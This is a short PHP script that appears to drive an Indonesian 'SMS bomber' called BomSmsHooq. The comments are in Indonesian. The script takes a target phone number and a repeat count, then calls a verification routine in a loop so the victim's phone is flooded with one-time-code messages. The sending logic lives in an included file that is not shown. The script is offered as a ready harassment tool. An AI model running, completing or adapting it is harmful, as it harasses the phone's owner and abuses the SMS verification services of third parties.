<?php
include 'funchooq.php';

/*
    https://github.com/nee48/BomSmsHooq
    Made by Handika Pratama
*/

$init = new Bom();

//Eksekusi Sms Boomber
$init->no = ""; //Nomer Hp tujuan Pakai tanpa awalan 62 / 0. contoh 81xxxxxxx
$loop = ""; //Jumlah eksekusi
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}